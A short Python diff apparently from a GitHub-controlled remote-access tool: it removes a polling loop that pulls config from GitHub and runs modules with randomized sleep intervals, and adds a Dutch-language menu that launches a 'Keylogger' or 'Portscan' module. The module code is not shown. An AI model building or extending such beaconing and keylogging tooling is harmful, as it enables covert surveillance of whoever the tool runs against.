@@ -23,15 +23,22 @@ def main():
 
     github = GithubIntegration(config['client_id'])
 
-    while True:
-        github.pull_config()
-        modules_to_run = config.get('modules', [])
-        for module_name in modules_to_run:
-            module = importlib.import_module(f"modules.{module_name}")
-            module.run()
-        
-        sleep_time = random.randint(config['poll_interval'], config['poll_interval'] + 10)
-        time.sleep(sleep_time)
+    # Prompt user to select a module
+    print("Kies een module om uit te voeren:")
+    print("1. Keylogger")
+    print("2. Portscan")
+    choice = input("Voer het nummer van je keuze in: ")
+
+    if choice == '1':
+        module_name = 'keylogger_combined'
+    elif choice == '2':
+        module_name = 'server_client_combined'
+    else:
+        print("Ongeldige keuze, probeer het opnieuw.")
+        return
+
+    module = importlib.import_module(f"modules.{module_name}")
+    module.run()
 
 if __name__ == "__main__":
     main()
